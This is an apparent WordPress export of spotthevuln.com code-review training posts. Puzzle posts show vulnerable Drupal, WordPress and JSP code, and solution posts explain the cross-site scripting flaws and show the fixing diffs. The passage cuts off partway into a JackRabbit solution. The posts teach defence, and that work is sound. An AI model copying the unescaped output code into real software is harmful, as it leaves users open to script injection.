			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Play Frisbee</title>
		<link>http://spotthevuln.com/2010/02/play_frisbee/</link>
		<pubDate>Mon, 08 Feb 2010 15:00:59 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=680</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Hippies, hippies... they want to save the world but all they do is smoke pot and play frisbee!</strong><strong>.
- Eric Cartman
</strong></blockquote>
[ccnLe_php]

function theme_admin_block($variables) {
$block = $variables['block'];

// Don't display the block if it has no content to display.
if (empty($block['show'])) {
return '';
}

if (empty($block['content'])) {
$output = &lt;&lt;&lt; EOT
&lt;div&gt;
&lt;h3&gt;
$block[title]
&lt;/h3&gt;
&lt;div&gt;
$block[description]
&lt;/div&gt;
&lt;/div&gt;
EOT;
}
else {
$output = &lt;&lt;&lt; EOT
&lt;div&gt;
&lt;h3&gt;
$block[title]
&lt;/h3&gt;
&lt;div&gt;
$block[content]
&lt;/div&gt;
&lt;/div&gt;
EOT;
}
return $output;
}

/**
* This function formats the content of an administrative block.
*
* @param $variables
* An associative array containing:
* - content: An array containing information about the block. It should
* include a 'title', a 'description' and a formatted 'content'.
*
* @ingroup themeable
*/
function theme_admin_block_content($variables) {
$content = $variables['content'];

if (!$content) {
return '';
}

if (system_admin_compact_mode()) {
$output = '&lt;ul&gt;';
foreach ($content as $item) {
$output .= '&lt;li&gt;' . l($item['title'], $item['href'], $item['localized_options']) . '&lt;/li&gt;';
}
$output .= '&lt;/ul&gt;';
}
else {
$output = '&lt;dl&gt;';
foreach ($content as $item) {
$output .= '&lt;dt&gt;' . l($item['title'], $item['href'], $item['localized_options']) . '&lt;/dt&gt;';
$output .= '&lt;dd&gt;' . $item['description'] . '&lt;/dd&gt;';
}
$output .= '&lt;/dl&gt;';
}
return $output;
}

/**
* This function formats an administrative page for viewing.
*
* @param $variables
* An associative array containing:
* - blocks: An array of blocks to display. Each array should include a
* 'title', a 'description', a formatted 'content' and a
* 'position' which will control which container it will be
* in. This is usually 'left' or 'right'.
*
* @ingroup themeable
*/
function theme_admin_page($variables) {
$blocks = $variables['blocks'];

$stripe = 0;
$container = array();

foreach ($blocks as $block) {
if ($block_output = theme('admin_block', array('block' =&gt; $block))) {
if (empty($block['position'])) {
// perform automatic striping.
$block['position'] = ++$stripe % 2 ? 'left' : 'right';
}
if (!isset($container[$block['position']])) {
$container[$block['position']] = '';
}
$container[$block['position']] .= $block_output;
}
}

$output = '&lt;div&gt;';
$output .= theme('system_compact_link');

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>680</wp:post_id>
		<wp:post_date>2010-02-08 08:00:59</wp:post_date>
		<wp:post_date_gmt>2010-02-08 15:00:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>play_frisbee</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c6LC2j]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[96602779f850d30b7a82ed18e368d2fa]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Play Frisbee]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Play Frisbee]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>394</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Play Frisbee &#8211; XSS]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/02/play-frisbee-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-02-12 08:02:15</wp:comment_date>
			<wp:comment_date_gmt>2010-02-12 15:02:15</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Play Frisbee – XSS</title>
		<link>http://spotthevuln.com/2010/02/play-frisbee-xss/</link>
		<pubDate>Fri, 12 Feb 2010 15:00:24 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=685</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Drupal

Fixed in Version: 5.21 and 6.15

Issue Type: XSS

Original Code: <a title="Hippies" href="http://spotthevuln.com/2010/02/play_frisbee/" target="_blank">Found Here</a>
<h2>Description</h2>
Simple XSS on Durpal 5.x and 6.x platforms.  What’s interesting about this particular vulnerability is it shows the advantages of implementing HTML output encoding near the point of consumption and the value of having descriptive function names.  In this sample, it’s difficult to determine whether the values contained within the $item[] array are already sanitized.  In order to determine whether $item[] is tainted, the code reviewer would have to find where $item[] values are set and trace them through the entire code base until it is presented to this particular usage.  Additionally, it seems the various values within the $item array: $item['title'], $item['href'], and $item['localized_options’] (all of which appear to be user/attacker controlled) are passed to a function called “l()”.  “l()” isn’t a very descriptive function name :).

The specific issue fixed here was the use of $item['description'] while building HTML markup.  The Durpal fixed this issue by passing $item['description'] to the filter_xss_admin(), near the point of consumption.  Filter_xss_admin() is a fairly descriptive function name and gives the reviewer a better understanding of what the code is doing.  Also, because filter_xss_admin() is used at the point of consumption, the code reviewer can rest assured that the value is encoded before being used, regardless of the previous input sanitization that may/may not have taken place.
<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">

function theme_admin_block($variables) {

$block = $variables['block'];

// Don't display the block if it has no content to display.

if (empty($block['show'])) {

return '';

}

if (empty($block['content'])) {

$output = &lt;&lt;&lt; EOT

&lt;div&gt;

&lt;h3&gt;

$block[title]

&lt;/h3&gt;

&lt;div&gt;

$block[description]

&lt;/div&gt;

&lt;/div&gt;

EOT;

}

else {

$output = &lt;&lt;&lt; EOT

&lt;div&gt;

&lt;h3&gt;

$block[title]

&lt;/h3&gt;

&lt;div&gt;

$block[content]

&lt;/div&gt;

&lt;/div&gt;

EOT;

}

return $output;

}

/**

* This function formats the content of an administrative block.

*

* @param $variables

* An associative array containing:

* - content: An array containing information about the block. It should

* include a 'title', a 'description' and a formatted 'content'.

*

* @ingroup themeable

*/

function theme_admin_block_content($variables) {

$content = $variables['content'];

if (!$content) {

return '';

}

if (system_admin_compact_mode()) {

$output = '&lt;ul&gt;';

foreach ($content as $item) {

$output .= '&lt;li&gt;' . l($item['title'], $item['href'], $item['localized_options']) . '&lt;/li&gt;';

}

$output .= '&lt;/ul&gt;';

}

else {

$output = '&lt;dl&gt;';

foreach ($content as $item) {

$output .= '&lt;dt&gt;' . l($item['title'], $item['href'], $item['localized_options']) . '&lt;/dt&gt;';

-$output .= '&lt;dd&gt;' . $item['description'] . '&lt;/dd&gt;';

+$output .= '&lt;dd&gt;' . filter_xss_admin($item['description']) . '&lt;/dd&gt;'

}

$output .= '&lt;/dl&gt;';

}

return $output;

}

/**

* This function formats an administrative page for viewing.

*

* @param $variables

* An associative array containing:

* - blocks: An array of blocks to display. Each array should include a

* 'title', a 'description', a formatted 'content' and a

* 'position' which will control which container it will be

* in. This is usually 'left' or 'right'.

*

* @ingroup themeable

*/

function theme_admin_page($variables) {

$blocks = $variables['blocks'];

$stripe = 0;

$container = array();

foreach ($blocks as $block) {

if ($block_output = theme('admin_block', array('block' =&gt; $block))) {

if (empty($block['position'])) {

// perform automatic striping.

$block['position'] = ++$stripe % 2 ? 'left' : 'right';

}

if (!isset($container[$block['position']])) {

$container[$block['position']] = '';

}

$container[$block['position']] .= $block_output;

}

}

$output = '&lt;div&gt;';

$output .= theme('system_compact_link');

</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>685</wp:post_id>
		<wp:post_date>2010-02-12 08:00:24</wp:post_date>
		<wp:post_date_gmt>2010-02-12 15:00:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>play-frisbee-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="drupal"><![CDATA[Drupal]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/byZcoX]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f4b627f2eb12b1fef5cc962d237acdfe]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Paid</title>
		<link>http://spotthevuln.com/2010/02/paid/</link>
		<pubDate>Mon, 15 Feb 2010 15:00:28 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=689</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>If you're going to be crazy, you have to get paid for it or else you're going to be locked up.
- Hunter S. Thompson</blockquote>
[ccnLe_php]

$comment_status = $commentdata['comment_approved'];

include('edit-form-comment.php');

break;

case 'confirmdeletecomment':

require_once('./admin-header.php');

$comment = $_GET['comment'];

$p = (int) $_GET['p'];

$commentdata = get_commentdata($comment, 1, true) or die(sprintf(__('Oops, no comment with this ID. &lt;a href="%s"&gt;Go back&lt;/a&gt;!'), 'edit.php'));

if (!user_can_delete_post_comments($user_ID, $commentdata['comment_post_ID'])) {

die( __('You are not allowed to delete comments on this post.') );

}

echo "&lt;div class=\"wrap\"&gt;\n";

echo "&lt;p&gt;" . __('&lt;strong&gt;Caution:&lt;/strong&gt; You are about to delete the following comment:') . "&lt;/p&gt;\n";

echo "&lt;table border=\"0\"&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;" . __('Author:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;" . __('E-mail:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author_email"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;". __('URL:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author_url"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;". __('Comment:') . "&lt;/td&gt;&lt;td&gt;" . stripslashes($commentdata["comment_content"]) . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;/table&gt;\n";

echo "&lt;p&gt;" . __('Are you sure you want to do that?') . "&lt;/p&gt;\n";

echo "&lt;form action='".get_settings('siteurl')."/wp-admin/post.php' method='get'&gt;\n";

echo "&lt;input type=\"hidden\" name=\"action\" value=\"deletecomment\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"p\" value=\"$p\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"comment\" value=\"$comment\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"noredir\" value=\"1\" /&gt;\n";

echo "&lt;input type=\"submit\" value=\"" . __('Yes') . "\" /&gt;";

echo "&amp;nbsp;&amp;nbsp;";

echo "&lt;input type=\"button\" value=\"" . __('No') . "\" onclick=\"self.location='". get_settings('siteurl') ."/wp-admin/edit.php?p=$p&amp;amp;c=1#comments';\" /&gt;\n";

echo "&lt;/form&gt;\n";

echo "&lt;/div&gt;\n";

break;

case 'deletecomment':

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>689</wp:post_id>
		<wp:post_date>2010-02-15 08:00:28</wp:post_date>
		<wp:post_date_gmt>2010-02-15 15:00:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>paid</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Paid]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Paid]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[pai]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[368fc4351fa0164db61239f00eecbe78]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/ctotwK]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>403</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Paid &#8211; XSS ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/02/paid-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-02-19 08:04:14</wp:comment_date>
			<wp:comment_date_gmt>2010-02-19 15:04:14</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Paid - XSS</title>
		<link>http://spotthevuln.com/2010/02/paid-xss/</link>
		<pubDate>Fri, 19 Feb 2010 15:00:24 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=694</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 1.5.1.3

Issue Type: XSS

Original Code: <a title="Paid" href="http://spotthevuln.com/2010/02/paid/" target="_blank">Found Here</a>
<h2>Description</h2>
This particular issue was a super simple XSS affecting WordPress.  In this case, the comment parameter is taken directly from the querystring here:
<blockquote>$comment = $_GET['comment'];</blockquote>
 and used to build HTML markup here:
<blockquote>echo "&lt;input type=\"hidden\" name=\"comment\" value=\"$comment\" /&gt;\n";</blockquote>
The WordPress developers fixed this particular issue by casting $comment to an INT.  $comment should only refer to a specific index for a comment and should never contain text.  This change was made in several places in the same file in an attempt to harden the code against XSS.  Our previous example showed that implementing HTML filtering near the point of consumption could be useful during code audits.  In this example, we see that some simple sanitization at variable assignment can also go a long way.

There is a curious detail here.  In this example, $comment is assigned a value directly from the querystring (attacker controlled).  Immediately below the vulnerable $comment assignment is another variable assignment, this time for a variable named $p (I assume “p” stands for “page number”).  $p is already cast to INT before being used elsewhere to build HTML markup.  It’s surprising that the WordPress developers would cast one variable to INT, while ignoring the second when the initial code was created.  I’m guessing the variable names played into this one J
<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">

$comment_status = $commentdata['comment_approved'];

include('edit-form-comment.php');

break;

case 'confirmdeletecomment':

require_once('./admin-header.php');

- $comment = $_GET['comment'];

+ $comment = (int) $_GET['comment'];

$p = (int) $_GET['p'];

$commentdata = get_commentdata($comment, 1, true) or die(sprintf(__('Oops, no comment with this ID. &lt;a href="%s"&gt;Go back&lt;/a&gt;!'), 'edit.php'));

if (!user_can_delete_post_comments($user_ID, $commentdata['comment_post_ID'])) {

die( __('You are not allowed to delete comments on this post.') );

}

echo "&lt;div class=\"wrap\"&gt;\n";

echo "&lt;p&gt;" . __('&lt;strong&gt;Caution:&lt;/strong&gt; You are about to delete the following comment:') . "&lt;/p&gt;\n";

echo "&lt;table border=\"0\"&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;" . __('Author:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;" . __('E-mail:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author_email"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;". __('URL:') . "&lt;/td&gt;&lt;td&gt;" . $commentdata["comment_author_url"] . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;tr&gt;&lt;td&gt;". __('Comment:') . "&lt;/td&gt;&lt;td&gt;" . stripslashes($commentdata["comment_content"]) . "&lt;/td&gt;&lt;/tr&gt;\n";

echo "&lt;/table&gt;\n";

echo "&lt;p&gt;" . __('Are you sure you want to do that?') . "&lt;/p&gt;\n";

echo "&lt;form action='".get_settings('siteurl')."/wp-admin/post.php' method='get'&gt;\n";

echo "&lt;input type=\"hidden\" name=\"action\" value=\"deletecomment\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"p\" value=\"$p\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"comment\" value=\"$comment\" /&gt;\n";

echo "&lt;input type=\"hidden\" name=\"noredir\" value=\"1\" /&gt;\n";

echo "&lt;input type=\"submit\" value=\"" . __('Yes') . "\" /&gt;";

echo "&amp;nbsp;&amp;nbsp;";

echo "&lt;input type=\"button\" value=\"" . __('No') . "\" onclick=\"self.location='". get_settings('siteurl') ."/wp-admin/edit.php?p=$p&amp;amp;c=1#comments';\" /&gt;\n";

echo "&lt;/form&gt;\n";

echo "&lt;/div&gt;\n";

break;

case 'deletecomment':

</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>694</wp:post_id>
		<wp:post_date>2010-02-19 08:00:24</wp:post_date>
		<wp:post_date_gmt>2010-02-19 15:00:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>paid-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bPK6w4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[55d6f11d3f0541744dab76dcb2961344]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Pause</title>
		<link>http://spotthevuln.com/2010/02/pause/</link>
		<pubDate>Mon, 22 Feb 2010 15:00:16 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=697</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It’s not so much knowing when to speak, when to pause.
- Jack Benny</strong></blockquote>
[ccnLe_java]

try {

String q = new String(request.getParameter("q").getBytes("ISO-8859-1"), "UTF-8");

String swrnum = request.getParameter("swrnum");

String numResults = null;

try {

numResults = NumberFormat.getNumberInstance().format(Long.parseLong(swrnum));

} catch (NumberFormatException e) {

// ignore

}

if (q == null || numResults == null) {

return;

}

request.setAttribute("title", "Search within results");

%&gt;&lt;jsp:include page="header.jsp"/&gt;

&lt;form name=f action="search.jsp"&gt;

&lt;table border=0 cellpadding=0 cellspacing=0 width=100%&gt;

&lt;tr&gt;&lt;table border=0 width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;br&gt;There were about &lt;b&gt;&lt;%= numResults %&gt;&lt;/b&gt; results for &lt;b&gt;&lt;%= q %&gt;&lt;/b&gt;.&lt;br&gt;

Use the search box below to search within these results.&lt;br&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;/td&gt;&lt;/tr&gt;

&lt;tr&gt;&lt;td valign=middle&gt;

&lt;table border=0 width=100%&gt;&lt;tr&gt;&lt;td&gt;

&lt;INPUT type=hidden name=q value="&lt;%= q %&gt;"&gt;

&lt;INPUT type=text name=as_q size=31 maxlength=256 value=""&gt;

&lt;INPUT type=submit VALUE="Search&amp;nbsp;within&amp;nbsp;results"&gt;

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;/td&gt;&lt;/tr&gt;

&lt;/table&gt;

&lt;/form&gt;

&lt;jsp:include page="footer.jsp"/&gt;

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>697</wp:post_id>
		<wp:post_date>2010-02-22 08:00:16</wp:post_date>
		<wp:post_date_gmt>2010-02-22 15:00:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pause</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bUN8uS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[59aa1b7a853b2e8b595441e80f852b97]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>407</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Pause &#8211; XSS]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/02/pause-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-02-26 09:05:25</wp:comment_date>
			<wp:comment_date_gmt>2010-02-26 16:05:25</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Pause - XSS</title>
		<link>http://spotthevuln.com/2010/02/pause-xss/</link>
		<pubDate>Fri, 26 Feb 2010 16:05:19 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=702</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: JackRibbit

Fixed in Version: 1.5.2

Issue Type: XSS

